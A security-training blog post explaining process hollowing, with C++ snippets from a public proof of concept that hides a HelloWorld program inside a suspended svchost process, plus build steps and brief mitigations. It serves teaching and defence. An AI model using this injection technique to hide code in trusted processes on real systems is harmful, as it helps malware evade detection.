# https://www.darkrelay.com/post/demystifying-hollow-process-injection

top of page

Skip to Main Content

> _Hollow Process Injection: Swapping out the engine of a car while it's running – except the car is a computer, and you're the mechanic!_

In the realm of cybersecurity and software development, understanding various code injection techniques is paramount and one technique that has gained attention in recent years is Hollow Process Injection.

## What is Hollow Process Injection?

Process hollowing, or Hollow Process Injection, is a stealthy technique used by malware to execute malicious code within the address space of a legitimate process. It involves creating a benign process in a suspended state, removing its executable code, injecting malicious code, altering the entry point, and then resuming the process. This makes the malicious activity appear as if it is originating from a trusted process, evading detection by security mechanisms.

![Hollow Process Injection](https://static.wixstatic.com/media/c173bb_9748329b380640a6ab05ff1259c9e031~mv2.png/v1/fill/w_740,h_444,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/c173bb_9748329b380640a6ab05ff1259c9e031~mv2.png)

Hollow Process Injection

Unlike classic process injection, where malicious code is injected into an already running process, **hollow process injection suspends a legitimate process**, overwrites its existing code section with malicious code, and then resumes the process. Essentially, the attacker creates a "hollowed-out" shell of the original process and injects their code within it.

## How Does Hollow Process Injection Work?

Imagine a legitimate program running on your system, like a basic notepad application. Hollow process injection exploits a loophole in how programs operate.

- **Target Selection:** The attacker first identifies a target process running on the system. This process is usually a trusted and commonly used application to evade detection.

- **Creating a Suspended Process:** The attacker creates a new instance of the target process in a suspended state. This allows them to manipulate the process before it starts executing.

- **Unmapping the Original Code**: The attacker utilizes system calls to unmap the memory sections that contain the suspended process's original executable code, thereby hollowing it out.

- **Allocating Memory:** Next, the attacker allocates memory within the suspended process to hold their malicious payload.

- **Injecting Malicious Code:** The attacker injects their malicious code into the allocated memory space of the hollowed process. This code can perform various malicious activities, such as stealing sensitive data, executing additional payloads, or establishing backdoor access.

- **Adjusting the Entry Point**: The entry point of the process is updated to point to the injected malicious code, ensuring the process executes the attacker's code when it resumes.

- **Resuming Execution:** Finally, the attacker resumes the execution of the hollowed process, which now runs the malicious code instead of the original code.


From the outside, the program appears to function normally. Under the hood, however, malicious code has completely replaced the legitimate code and is now running with the same privileges as the original process.

This allows the attacker to stealthily perform harmful activities, such as stealing data, installing additional malware, or disrupting system operations, all while avoiding detection.

## Hollow Process Injection PoC

In this blog article, we'll look at the numerous procedures involved in process hollowing via a practical demonstration based on a code sample available on GitHub. The code we will use for this demonstration is available at the following link: [https://github.com/m0n0ph1/Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing)

The core implementation of the hollow process injection or process hollowing technique is found in the " [sourcecode/ProcessHollowing/ProcessHollowing.cpp](https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/ProcessHollowing.cpp)" file. The file includes essential functions for memory allocation, code writing, and execution of the hollowed process.

The hollowing procedure commences with the construction of a suspended svchost process (target), which is subsequently followed by the execution of helloworld.exe (code to be run) within its context. This will generate a message window. Let us now delve into the code to gain a more profound understanding of hollowing.

- **Creating a Suspended Process:** The first step in process hollowing is to create a new process in a suspended state. This allows us to manipulate the process before it begins execution. In this example, we create a suspended svchost process using the CreateProcessA function.The CreateProcessA function is used to create a new process in a suspended state. The CREATE\_SUSPENDED flag ensures that the process does not start executing immediately. This allows us to manipulate the process's memory before it begins running.


```
CreateProcessA(0, pDestCmdLine, 0, 0,  0, CREATE_SUSPENDED, 0, 0, pStartupInfo, pProcessInfo);
```

- **Reading the Remote Process Environment Block (PEB):** Next, we read the Process Environment Block (PEB) of the suspended process. The PEB contains important information about the process, including the base address of the executable image. The custom functions ReadRemotePEB and ReadRemoteImage are used to achieve this.The PEB provides details about the process, such as loaded modules and the base address of the executable. Reading this information is crucial for understanding the memory layout of the process and for correctly injecting the new code.


```
PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);
```

- **Opening the Source Image:** The source executable (helloworld.exe) is opened, and its contents are read into memory. This is done using the CreateFileA, ReadFile, and GetFileSize functions. The contents of the file are stored in a buffer for later use.


```
HANDLE hFile = CreateFileA( pSourceFile, GENERIC_READ,  0, 0, OPEN_ALWAYS, 0, 0);

// ... Some code ...

DWORD dwSize = GetFileSize(hFile, 0);
PBYTE pBuffer = new BYTE[dwSize];
DWORD dwBytesRead = 0;
ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);
CloseHandle(hFile);
PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);
PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);
```

- **Unmapping the Original Code:** Before injecting the new code, we need to unmap the original code from the target process using the NtUnmapViewOfSection function. This function is retrieved dynamically from ntdll.dll. By unmapping the original code, it is possible to free up the memory that the legitimate process's code had previously occupied. This step is necessary to allocate memory for the new code.


```
HMODULE hNTDLL = GetModuleHandleA("ntdll");

FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

_NtUnmapViewOfSection NtUnmapViewOfSection =
(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

DWORD dwResult = NtUnmapViewOfSection
(
pProcessInfo->hProcess,
pPEB->ImageBaseAddress
);
```

- **Allocating Memory:** The memory is allocated in the target process for the new code using VirtualAllocEx. VirtualAllocEx allocates memory in the target process's address space. The memory is allocated with the necessary permissions (PAGE\_EXECUTE\_READWRITE) to allow the new code to execute.


```
PVOID pRemoteImage = VirtualAllocEx
(
pProcessInfo->hProcess,
pPEB->ImageBaseAddress,
pSourceHeaders->OptionalHeader.SizeOfImage,
MEM_COMMIT | MEM_RESERVE,
PAGE_EXECUTE_READWRITE
);
```

- **Writing the Headers, Sections and Handling Relocations:** The next step is to write the headers and sections of the source image into the allocated memory of the target process. WriteProcessMemory is used to perform this task. It writes the headers and sections of the source image into the target process's memory. This effectively transfers the code and data from the source executable to the target process.If the base address of the image changes, we need to handle relocations to adjust the addresses in the code. Relocation step ensures that all pointers and references are correctly resolved in the new memory location.


```
if (!WriteProcessMemory
(
pProcessInfo->hProcess,
pPEB->ImageBaseAddress,
pBuffer,
pSourceHeaders->OptionalHeader.SizeOfHeaders,
0
))
```

- **Setting the Entry Point:** The entry point of the process is adjusted to point to the new code by modifying the thread context using GetThreadContext and SetThreadContext. GetThreadContext retrieves the current context of the main thread, and SetThreadContext updates it to point to the new entry point.


```
LPCONTEXT pContext = new CONTEXT();
pContext->ContextFlags = CONTEXT_INTEGER;

// ... Some code ...

if (!GetThreadContext(pProcessInfo->hThread, pContext))
{
	printf("Error getting context\r\n");
	return;
}

pContext->Eax = dwEntrypoint;

// ... Some code ...

if (!SetThreadContext(pProcessInfo->hThread, pContext))
{
	printf("Error setting context\r\n");
	return;
}
```

- Resuming Execution: Finally, we resume the suspended process so that it begins executing the injected code using ResumeThread.


```
if (!ResumeThread(pProcessInfo->hThread))
{
	printf("Error resuming thread\r\n");
	return;
}
```

### Compile the PoC

[Install Visual Studio](https://visualstudio.microsoft.com/vs/features/cplusplus/) on your Windows to compile the the C++ project and generate the executable. The full code is available from the [Github project](https://github.com/m0n0ph1/Process-Hollowing). A solution file (.sln) is also available inside the sourcecode folder. After cloning the Github project, double click on the [solution file](https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing.sln) to open the project.

![Process Hollowing Code (POC)](https://static.wixstatic.com/media/151966_4f872da9b20c4a5788c21352e6a71b55~mv2.png/v1/fill/w_49,h_23,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/151966_4f872da9b20c4a5788c21352e6a71b55~mv2.png)

The project contains code for both process hollowing as well as the HelloWorld application. Build the entire project to compile both executables.

**Note**: An additional line may be included in the ProcessHollowing.cpp file. The additional line will display the PID (Process ID) of the process, aiding in the identification of the svchost process that has been hollowed out. Insert the following line after using the CreateProcessA function in the beginning.

```
printf("Process created successfully. PID: %u\n", pProcessInfo->dwProcessId)
```

![Process Hollowing Code (POC)](https://static.wixstatic.com/media/151966_af2d6b685a544726969bf2bcc4b86bc2~mv2.png/v1/fill/w_49,h_19,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/151966_af2d6b685a544726969bf2bcc4b86bc2~mv2.png)

### Execute the PoC

Once the compiled program is created, navigate to the Release folder (if you selected Release during the build) within the VS project folder, double-click on the executable, and you should be able to see a message box with "Hello World".

![successful process hollowing](https://static.wixstatic.com/media/151966_932982d8ad644410bb67278f8f9299c5~mv2.png/v1/fill/w_49,h_24,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/151966_932982d8ad644410bb67278f8f9299c5~mv2.png)

Based on the above screenshot, it is evident that a new svchost process was generated with a Process ID (PID) of 12884. The console displays the many stages that led to the execution of the HelloWorld program.

Upon inspecting the task manager, we should see the presence of an svchost process instead of the HelloWorld program, indicating the effective implementation of hollowing.

![process-hollowing-task-manager](https://static.wixstatic.com/media/151966_c87b9441629b4e0b873ecd5628b8be98~mv2.png/v1/fill/w_80,h_65,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/151966_c87b9441629b4e0b873ecd5628b8be98~mv2.png)

The HelloWorld program has been successfully hidden within the svchost process.

## How to Mitigate Hollow Process Injection?

To detect hollow process injection and stop the bypass of traditional AV software, follow the below security measures.

- **Apply Security Patches:** Patching vulnerabilities in your software can significantly reduce the risk of exploitation.

- **Implement EDR:** Using Antivirus and anti-malware software, use EDR solutions to monitor the system process 24/7.

- **Least Privilege:** Ensure the principle of least privilege is followed to minimize the risk of system compromise through hollow process injection.

- **Practice User Awareness:** Be cautious when opening unknown attachments or clicking suspicious links.


## Conclusion

Hollow process injection is a sophisticated code injection technique attackers use to evade detection and carry out malicious activities. By understanding how it works, organizations can be more vigilant and take steps to protect their systems.

#### References

- [https://attack.mitre.org/techniques/T1055/012/](https://attack.mitre.org/techniques/T1055/012/)

- [https://github.com/m0n0ph1/Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing)

- [https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations](https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations)


Register for instructor-led online courses today!

[**https://www.darkrelay.com/courses**](https://www.darkrelay.com/courses)

Check out our self-paced courses!

[https://www.darkrelay.com/training](https://www.darkrelay.com/training)

Contact us with your custom pen testing needs at: [**info@darkrelay.com**](mailto:info@darkrelay.com)  or [**WhatsApp**](http://wa.me/+919380506281).

Follow us: [LinkedIn](https://www.linkedin.com/company/darkrelay/) [Twitter](https://twitter.com/darkrelaylabs) [Facebook](https://www.facebook.com/darkrelaylabs) [Instagram](https://www.instagram.com/darkrelay/) [YouTube](https://www.youtube.com/channel/UCtnLa860lUkRhtmpYvbXlTw) [Pinterest](https://in.pinterest.com/darkrelay/).

[Fuzzing with libFuzzer](https://www.darkrelay.com/post/fuzzing-with-libfuzzer)

[Thick Client Penetration Testing: Uncovering Vulnerabilities in Desktop Applications](https://www.darkrelay.com/post/thick-client-penetration-testing)

[Penetration Testing: Understanding Its Benefits and Real-World Applications](https://www.darkrelay.com/post/penetration-testing-understanding-its-benefits-and-real-world-applications)

bottom of page